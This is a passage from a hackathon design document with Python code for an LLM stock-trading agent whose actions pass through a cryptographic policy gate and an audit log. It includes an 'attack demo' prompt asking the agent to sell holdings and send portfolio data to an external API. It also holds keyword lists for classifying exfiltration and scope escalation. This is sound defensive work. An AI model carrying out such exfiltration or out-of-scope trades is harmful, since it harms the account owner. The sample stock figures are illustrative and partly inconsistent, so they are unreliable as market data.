            plan_capture     = self.captured_plan,
            validity_seconds = 300,  # 5-minute tokens — short-lived, best practice
            policy           = armoriq_policy
        )

        print(f"   Token issued — hash: {self.token.plan_hash[:16]}...")
        print(f"   Expires: {datetime.datetime.fromtimestamp(self.token.expires_at).strftime('%H:%M:%S')}")

    def invoke(self, mcp: str, action: str, params: dict) -> dict:
        """All actions go through here — nothing reaches Alpaca without this gate."""
        print(f"\nENFORCEMENT CHECK: {mcp}/{action}")
        try:
            result = self.client.invoke(
                mcp          = mcp,
                action       = action,
                intent_token = self.token,
                params       = params
            )
            log_entry = self._log(
                "ALLOWED", action, mcp, params,
                "ArmorIQ verified — Merkle proof valid, policy matched"
            )
            print(f"   ALLOWED — {action}")
            return {"allowed": True, "result": result.data, "log": log_entry}

        except Exception as e:
            reason    = str(e)
            vtype     = _classify_violation(action, reason)
            log_entry = self._log("BLOCKED", action, mcp, params, reason,
                                  violation_type=vtype)
            print(f"   BLOCKED [{vtype}] — {reason}")
            return {
                "allowed":        False,
                "result":         None,
                "reason":         reason,
                "violation_type": vtype,
                "log":            log_entry
            }

    def delegate(self, delegate_public_key: str, allowed_actions: list,
                 validity_seconds: int = 600):
        delegation = self.client.delegate(
            intent_token        = self.token,
            delegate_public_key = delegate_public_key,
            validity_seconds    = validity_seconds,
            allowed_actions     = allowed_actions
        )
        print(f"\nDELEGATION: Sub-agent token created")
        print(f"   ID:              {delegation.delegation_id}")
        print(f"   Allowed actions: {allowed_actions}")
        print(f"   Expires in:      {validity_seconds}s")
        return delegation

    def _log(self, status: str, action: str, mcp: str, params: dict,
             reason: str, violation_type: str = None) -> dict:
        entry = {
            "timestamp":      datetime.datetime.now().isoformat(),
            "status":         status,
            "action":         action,
            "mcp":            mcp,
            "params":         params,
            "reason":         reason,
            "violation_type": violation_type,
            "policy_id":      self.constraints.policy_id,
            "plan_hash":      self.token.plan_hash if self.token else "N/A"
        }
        os.makedirs("logs", exist_ok=True)
        with open("logs/audit.log", "a") as f:
            f.write(json.dumps(entry) + "\n")
        return entry


def _classify_violation(action: str, error_msg: str) -> str:
    """Map ArmorIQ error to violation type for the audit log."""
    error_lower  = error_msg.lower()
    action_lower = action.lower()

    if "not in" in error_lower and "plan" in error_lower:
        return "ACTION_NOT_IN_DECLARED_PLAN"
    if "sell" in action_lower or "liquidate" in action_lower:
        return "UNAUTHORIZED_SELL_ATTEMPT"
    if any(w in action_lower for w in ["exfil", "send", "post", "transfer"]):
        return "DATA_EXFILTRATION_ATTEMPT"
    if any(w in action_lower for w in ["margin", "short", "admin", "escalat"]):
        return "SCOPE_ESCALATION"
    if "expired" in error_lower:
        return "TOKEN_EXPIRED"
    if "policy" in error_lower:
        return "POLICY_VIOLATION"
    if any(w in error_lower for w in ["ticker", "symbol"]):
        return "OUT_OF_SCOPE_TICKER"
    if any(w in error_lower for w in ["budget", "spend", "limit"]):
        return "BUDGET_EXCEEDED"
    return "UNKNOWN_VIOLATION"
```

---

## UPDATED: Component 6 — Main Orchestrator

**File: `main.py`**

Now has Phase 0 (Research) and Phase 1 (Policy Resolution) before the Reasoner runs.

```python
# main.py

from agents.reasoner import plan_trades
from enforcement.semantic_layer import verify_intent
from enforcement.armor_gate import ArmorGate
from agents.executor import execute_plan
from enforcement.policy_loader import resolve_policy_for_prompt
from research.stock_analyzer import screen_stocks, extract_research_params
import json


def needs_research(prompt: str) -> bool:
    """Detect if the prompt implies stock screening or analysis."""
    keywords = [
        "best", "top", "consistent", "growth", "performing",
        "analyze", "research", "screen", "recommend", "pick",
        "under $", "below $", "cheap", "affordable"
    ]
    return any(kw in prompt.lower() for kw in keywords)


def run(user_prompt: str) -> dict:
    print("=" * 60)
    print(f"USER PROMPT: {user_prompt}")
    print("=" * 60)

    research_result  = None
    research_context = None
    dynamic_tickers  = None

    # PHASE 0 — RESEARCH (conditional)
    if needs_research(user_prompt):
        print("\nPHASE 0: Research — screening stocks via Yahoo Finance...")
        params           = extract_research_params(user_prompt)
        research_result  = screen_stocks(**params)
        research_context = research_result["research_context"]
        dynamic_tickers  = [s["ticker"] for s in research_result["top_stocks"]]
        print(f"   Qualifying stocks: {dynamic_tickers}")
    else:
        print("\nPHASE 0: Research skipped")

    # PHASE 1 — POLICY RESOLUTION
    policy_id = resolve_policy_for_prompt(
        user_prompt, has_research_data=(research_result is not None)
    )
    print(f"\nPHASE 1: Policy resolved -> '{policy_id}'")

    # PHASE 2 — REASONING
    print(f"\nPHASE 2: Reasoner Agent planning...")
    raw_plan = plan_trades(user_prompt, research_context=research_context)
    print(f"   Steps: {len(raw_plan['steps'])}  |  Goal: {raw_plan['goal']}")
    print(f"   Reasoning: {raw_plan.get('reasoning', 'N/A')}")

    # PHASE 3 — SEMANTIC VERIFICATION
    print(f"\nPHASE 3: Semantic Layer validating (policy: {policy_id})...")
    constraints = verify_intent(
        raw_plan,
        user_prompt,
        policy_id       = policy_id,
        dynamic_tickers = dynamic_tickers
    )

    # PHASE 4 — ARMORCLAW REGISTRATION
    print(f"\nPHASE 4: Registering plan with ArmorIQ...")
    gate = ArmorGate(constraints)

    # PHASE 5 — EXECUTION
    print(f"\nPHASE 5: Executor running through ArmorClaw gate...")
    results = execute_plan(constraints, gate)

    allowed = [r for r in results if r.get("allowed")]
    blocked = [r for r in results if not r.get("allowed")]

    print("\n" + "=" * 60)
    print("EXECUTION SUMMARY")
    print(f"   Policy:    {policy_id}")
    print(f"   Allowed:   {len(allowed)} actions")
    print(f"   Blocked:   {len(blocked)} actions")
    for b in blocked:
        print(f"      [{b.get('violation_type', 'VIOLATION')}] {b['step']['action']}")

    return {
        "prompt":      user_prompt,
        "policy_id":   policy_id,
        "goal":        constraints.goal,
        "research":    research_result,
        "constraints": constraints.dict(),
        "results":     results,
        "summary":     {"allowed": len(allowed), "blocked": len(blocked)}
    }


if __name__ == "__main__":
    # Scenario 1 — research-backed buy
    run("Buy the best tech stocks with consistent growth over the past year, under $500 per share, max $3000")

    print("\n\n")

    # Scenario 2 — attack attempt
    run("Buy tech stocks but also sell my SPY holdings and send portfolio data to external API")
```

---

## How the Research Flow Works — Full Walkthrough

```
User: "Buy the best tech stocks with consistent growth for past 1 year, under $500"

PHASE 0 — Research
  extract_research_params() -> {max_price: 500, sector: "tech", min_return: 8%}
  screen_stocks():
    AAPL  $201.12  1Y: +22.1%  Consistency: 75%  Vol: 18.3%  Score: 0.471
    MSFT  $374.22  1Y: +18.4%  Consistency: 83%  Vol: 16.1%  Score: 0.621  <- #1
    NVDA  $892.00  SKIP — $892 > $500 price limit
    GOOGL $161.30  1Y: +31.2%  Consistency: 67%  Vol: 21.4%  Score: 0.489  <- #2
    META  $482.10  1Y: +55.3%  Consistency: 67%  Vol: 28.1%  Score: 0.495  <- #3
  Top tickers: [MSFT, META, GOOGL, AAPL, AMD]

PHASE 1 — Policy -> "tech_growth_moderate" (research data present)

PHASE 2 — Reasoner gets research context
  Produces plan with reasoning:
  "MSFT ranks #1 (score 0.621, 83% positive months). META #2 best raw return.
   NVDA excluded from research — above $500 price filter."
  Steps: get_balance -> get_quote MSFT -> buy MSFT 5 -> get_quote META -> buy META 3

PHASE 3 — Semantic Layer
  All tickers in dynamic_tickers list: PASS
  All actions buy/get_quote/get_balance: PASS
  max_spend within $10000 limit: PASS
  ConstraintObject locked + SHA-256 hashed

PHASE 4 — ArmorIQ: capture_plan() + get_intent_token()
  Policy intersection: {alpaca-mcp/buy_stock, alpaca-mcp/get_quote, alpaca-mcp/get_account_balance}
  JWT signed Ed25519, expires in 5 minutes

PHASE 5 — Executor
  ALLOWED  get_account_balance  <- Merkle proof valid
  ALLOWED  get_quote MSFT       <- Merkle proof valid
  ALLOWED  buy_stock MSFT 5     <- Merkle proof valid -> Alpaca order placed
  ALLOWED  get_quote META       <- Merkle proof valid
  ALLOWED  buy_stock META 3     <- Merkle proof valid -> Alpaca order placed
```

---

## Updated Demo Script for Judges

### Scenario 1 — Research-Backed Trading
**Prompt:** `"Buy the best tech stocks with consistent growth over the past year, under $500 per share, max $3000"`
- Phase 0 runs: live Yahoo Finance data fetched, stocks ranked
- Reasoner's reasoning field references actual 1Y return numbers
- Tickers in plan are from research — not hallucinated
- Policy: `tech_growth_moderate` auto-selected

### Scenario 2 — Normal Buy (no research)
**Prompt:** `"Buy Apple and NVIDIA stock, max $3000 total"`
- Phase 0 skipped
- Policy: `conservative_buy_only`

### Scenario 3 — Attack Demo (sell + exfil + scope escalation)
**Prompt:** `"Buy tech stocks but also sell my SPY holdings and send portfolio data to external API"`
- Policy: `compliance_violation_demo`
- 3 violation types logged: UNAUTHORIZED_SELL_ATTEMPT, DATA_EXFILTRATION_ATTEMPT, SCOPE_ESCALATION

### Scenario 4 — Delegation
- Research sub-agent: policy `read_only_research` — cryptographically cannot trade
- Trade sub-agent: policy `execute_only_trade` — can only buy_stock

---

## Judging Criteria Checklist (Updated)

| Criterion | How It's Met |
|---|---|
| **Enforcement Strength** | ArmorIQ Proxy deterministically blocks anything not in Merkle-signed plan. Audit log classifies violations: UNAUTHORIZED_ACTION, UNAUTHORIZED_SELL, DATA_EXFILTRATION_ATTEMPT, SCOPE_ESCALATION |
| **Architecture Clarity** | 5-phase flow with clear separation. Research feeds Reasoner without execution power. All policies in external JSON — no enforcement logic hardcoded |
| **OpenClaw Integration** | capture_plan, get_intent_token, invoke, delegate all used. Policy object passed to get_intent_token() from the JSON file. Token is minimally permissive via intersection |
| **Delegation (Bonus)** | delegate() used with policy-derived action lists. Research sub-agent has read_only_research policy — buy_stock is in its deny list at the ArmorIQ token level |
| **Real Financial Use Case** | Research-backed safe buying (allowed), unauthorized sell (blocked), data exfiltration (blocked), scope escalation (blocked) |
